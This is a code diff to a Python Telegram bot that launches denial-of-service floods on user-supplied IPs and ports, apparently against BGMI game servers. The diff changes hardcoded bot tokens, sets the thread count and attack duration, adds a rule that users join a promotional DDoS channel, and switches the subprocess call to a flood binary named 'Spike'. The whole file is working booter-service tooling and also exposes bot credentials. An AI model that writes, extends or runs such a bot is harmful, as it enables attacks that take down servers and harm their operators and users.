@@ -17,11 +17,17 @@ from requests.exceptions import ReadTimeout
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 # Telegram bot token and channel IDs
-TOKEN = '7934887542:AAFu9iTGdI8gAqCDlfiBmE-MIOGPIi5Q-HU'  # Replace with your actual bot token
-CHANNEL_ID = '-1002400803425'  # Replace with your specific channel or group ID for attacks
-FEEDBACK_CHANNEL_ID = '-1002124760113'  # Replace with your specific channel ID for feedback
+TOKEN = '7788865701:AAHg0Ii5mPeIJcReFzGgSg_4qFaN8pF9ArQ'  # Replace with your actual bot token
+CHANNEL_ID = '-1002287609881'  # Replace with your specific channel or group ID for attacks
+FEEDBACK_CHANNEL_ID = '-1002294913266'  # Replace with your specific channel ID for feedback
 message_queue = []
+# Predefined values for packet size and thread count
+PREDEFINED_PACKET_SIZE = 8  # Example: 1024 bytes
+PREDEFINED_THREAD_COUNT = 900  # Example: 500 threads
 
+# Official channel details
+OFFICIAL_CHANNEL = "@titanddos24op"  # Replace with your channel username or ID
+CHANNEL_LINK = "https://t.me/titanddos24op"  # Replace with your channel link
 
 # Initialize the bot
 bot = telebot.TeleBot(TOKEN)
@@ -43,12 +49,22 @@ pending_feedback = set()
 reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)
 
 # Configuration
-COOLDOWN_DURATION = 180  # 1 minute cooldown
+COOLDOWN_DURATION = 60  # 1 minute cooldown
 BAN_DURATION = timedelta(hours=1)  # 1 hour ban for invalid feedback
 DAILY_ATTACK_LIMIT = 5000
-EXEMPTED_USERS = [7163028849,7563633049,1229319067,6599366816,1021608281, 5774720191,1923288722, 7486262553]
+EXEMPTED_USERS = [7163028849, 7184121244]
 # Configuration
-MAX_ATTACK_DURATION = 240  # Maximum attack duration in seconds (e.g., 300 seconds = 5 minutes)
+MAX_ATTACK_DURATION = 60  # Maximum attack duration in seconds (e.g., 300 seconds = 5 minutes)
+
+def is_member(user_id):
+    """Check if the user is a member of the official channel."""
+    try:
+        chat_member = bot.get_chat_member(OFFICIAL_CHANNEL, user_id)
+        return chat_member.status in ["member", "administrator", "creator"]
+    except Exception as e:
+        logging.error(f"Failed to check membership: {e}")
+        return False
+
 
 def sanitize_filename(filename):
     """Sanitize filenames to prevent path traversal."""
@@ -142,12 +158,28 @@ def handle_photo(message):
             os.remove(image_path)
 
 
-# Attack command handler
 @bot.message_handler(commands=['bgmi'])
 def bgmi_command(message):
     global attack_in_progress
     reset_daily_counts()
     user_id = message.from_user.id
+
+    # Check if user has joined the official channel
+    if not is_member(user_id):
+        # Create a "Join Channel" button
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🌟 Join Official Channel 🌟", url=CHANNEL_LINK))
+        markup.add(InlineKeyboardButton("✅ I've Joined", callback_data="check_membership"))
+
+        bot.reply_to(
+            message,
+            "🚨 *Access Denied* 🚨\n\n"
+            "To use this bot, you must join our official channel.\n"
+            "Click the button below to join and then press *'I've Joined'* to verify.",
+            reply_markup=markup,
+            parse_mode="Markdown"
+        )
+        return
 
     # Channel restriction check
     if str(message.chat.id) != CHANNEL_ID:
@@ -236,12 +268,21 @@ def bgmi_command(message):
     finally:
         attack_in_progress = False
 
+@bot.callback_query_handler(func=lambda call: call.data == "check_membership")
+def check_membership(call):
+    """Handle the 'I've Joined' button click."""
+    user_id = call.from_user.id
+    if is_member(user_id):
+        bot.answer_callback_query(call.id, "✅ Thank you for joining! You can now use /bgmi.")
+    else:
+        bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet. Please join and try again.")
+
 async def execute_attack(ip, port, duration, username):
-    """Run attack command asynchronously and wait for the duration to complete."""
+    """Run attack command asynchronously with predefined packet size and thread count."""
     try:
-        # Start the attack process
+        # Start the attack process with predefined values
         proc = await asyncio.create_subprocess_shell(
-            f"./megoxer {ip} {port} {duration}",
+            f"./Spike {ip} {port} {duration} {PREDEFINED_PACKET_SIZE} {PREDEFINED_THREAD_COUNT}",
             stderr=asyncio.subprocess.PIPE
         )
 
@@ -251,7 +292,8 @@ async def execute_attack(ip, port, duration, username):
         # Send attack completion message
         bot.send_message(
             CHANNEL_ID,
-            f"✅ Attack on {ip}:{port} completed after {duration} seconds."
+            f"✅ Attack on {ip}:{port} completed! "
+            f"Duration: {duration}s, Packet Size: {PREDEFINED_PACKET_SIZE}, Threads: {PREDEFINED_THREAD_COUNT}"
         )
     except Exception as e:
         # Send error message if something goes wrong
